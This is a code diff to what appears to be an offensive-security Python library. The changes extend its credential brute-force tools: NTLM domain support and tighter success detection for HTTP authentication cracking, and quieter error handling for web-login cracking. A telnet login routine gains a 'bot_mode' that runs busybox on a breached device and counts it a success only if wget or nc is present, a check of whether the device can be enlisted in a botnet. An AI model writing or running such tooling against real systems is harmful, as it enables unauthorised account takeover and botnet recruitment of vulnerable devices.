@@ -15,17 +15,17 @@ from .pager import *
 
 class http_auth_bruteforce:
  __slots__=["logs","stop","finish","result"]
- def __init__(self,u,word_list=[],logs=True,proxy=None,proxies=None,cookie=None,user_agent=None,timeout=10):
+ def __init__(self,u,word_list=[],logs=True,domain=None,proxy=None,proxies=None,cookie=None,user_agent=None,timeout=10):
   self.stop=False
   self.logs=logs
   self.finish=False
   self.result={}
-  t=threading.Thread(target=self.crack,args=(u,word_list,logs,proxy,proxies,cookie,user_agent,timeout,))
+  t=threading.Thread(target=self.crack,args=(u,domain,word_list,logs,proxy,proxies,cookie,user_agent,timeout,))
   t.daemon=True
   t.start()
  def done(self):
   return self.finish
- def crack(self,u,word_list,logs,proxy,proxies,cookie,user_agent,timeout):
+ def crack(self,u,domain,word_list,logs,proxy,proxies,cookie,user_agent,timeout):
   if user_agent:
    us=user_agent
   else:
@@ -55,6 +55,8 @@ class http_auth_bruteforce:
     if self.logs==True:
      print("==>Ntlm")
     auth_type = requests_ntlm.HttpNtlmAuth
+    if not domain:
+     raise Exception('You need to specify a domain for "Ntlm" authentication !\n\nbane.http_auth_bruteforce("http://example.com",domain="example.com",.....)')
    else:
     if self.logs==True:
      print("==>Unknown type")
@@ -71,6 +73,8 @@ class http_auth_bruteforce:
      self.finish=True
      break
     username=x.split(":")[0]
+    if domain and auth_type==requests_ntlm.HttpNtlmAuth:
+     username=domain+'\\'+username
     password=x.split(":")[1]
     if self.logs==True:
      print("[*]Trying: {} {}".format(username,password))
@@ -88,7 +92,7 @@ class http_auth_bruteforce:
     if cookie:
      hed.update({"Cookie":cookie})
     r=requests.get(u, auth=auth_type(username,password),proxies=prox,headers=hed, verify=False, timeout=timeout)
-    if (r.status_code == 200)and("wrong" not in r.text.lower())and("invalid" not in r.text.lower())and("denied" not in r.text.lower())and("unauthorized" not in r.text.lower()):
+    if (r.status_code == 200)and("required" not in r.text.lower())and("wrong" not in r.text.lower())and("invalid" not in r.text.lower())and("denied" not in r.text.lower())and("unauthorized" not in r.text.lower()):
      if self.logs==True:
       print("[+]Success")
      self.result={u:username+":"+password}
@@ -97,7 +101,7 @@ class http_auth_bruteforce:
     else:
      if self.logs==True:
       print("[-]Fail")
-   except:
+   except Exception as ex:
     if self.logs==True:
      print("[-]Fail")
   self.finish=True
@@ -199,7 +203,7 @@ class web_login_bruteforce:
      if self.logs==True:
       print("[-]Fail")
    except Exception as e:
-    print(e)
+    pass
     if self.logs==True:
      print("[-]Fail")
   self.finish=True
@@ -462,11 +466,17 @@ def smtp(u, username,password,p=25,ehlo=True,helo=False,ttls=False):
   pass
  return False
 
-def telnet(u,username,password,p=23,timeout=5):
+def telnet(u,username,password,p=23,timeout=5,bot_mode=False):
  try:
   t=xtelnet.session()
   t.connect(u,username=username,password=password,p=p,timeout=timeout)
+  if bot_mode==True:
+   a=t.execute('busybox')
   t.destroy()
+  if bot_mode==True:
+   if "wget" in a or "nc" in a:
+    return True
+   return False
   return True
  except:
   pass
